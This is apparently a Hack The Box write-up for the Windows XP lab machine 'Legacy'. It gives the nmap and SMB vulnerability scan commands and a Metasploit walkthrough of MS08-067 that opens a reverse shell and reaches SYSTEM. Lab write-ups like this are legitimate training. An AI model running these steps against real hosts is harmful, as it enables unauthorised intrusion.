## Box: Legacy

## Target IP: `10.10.10.4`

---

### Initial Nmap Scan

Ran:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.10.10.4
```

Ports open:

| Port | Service | Version |
| --- | --- | --- |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | Windows XP microsoft-ds |

Host is running Windows XP.

Old and wide open.

---

### SMB Vulnerability Scan

Ran:

```bash
sudo nmap --script=smb-vuln* 10.10.10.4
```

Results:

- **ms08-067**: Vulnerable.
- **ms17-010**: Vulnerable.
- Confirmed critical remote code execution paths.

---

### Exploitation

Focused on MS08-067.

Fired up Metasploit:

```bash
msfconsole
```

Searched:

```bash
search ms08-067
```

Selected exploit.

Set parameters:

```bash
set rhosts 10.10.10.4
set lhost tun0
exploit
```

Popped a shell immediately.

Verified:

```bash
getuid
```

Output:

```
Server username: NT AUTHORITY\SYSTEM
```

Root from the jump.

---

### Flags

Found user flag:

```bash
C:\Documents and Settings\john\Desktop\user.txt
```

Found root flag:

```bash
C:\Documents and Settings\Administrator\Desktop\root.txt
```

Box finished.
